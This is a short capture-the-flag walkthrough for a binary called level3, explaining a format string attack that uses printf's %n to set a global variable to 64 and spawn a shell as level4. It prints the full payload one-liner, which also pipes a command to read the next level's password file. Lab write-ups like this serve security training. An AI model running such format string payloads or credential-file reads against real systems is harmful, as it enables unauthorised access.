# Walkthrough

## Disassembling the executable

see source.c

## Exploit

In order to execute /bin/sh as level4, the global variable m must be equal to 64.

We modified the value of m using a format string attack.

Using the buffer p, we are going to submit data that will be evaluated as instructions.
In our payload, we exploit the format string of printf to pop the stack until we reach the address of our payload, printf resolves the %n by setting the value hold at the first address at the top of the stack (here a pointer to the global variable m) as the length of its string. 

```
(python -c "print('\x8c\x98\x04\x08 %p %p %p abcdefghijklmnopqrstuvwxyz12345%n')"; echo 'cat /home/user/level4/.pass
') | ./level3
```
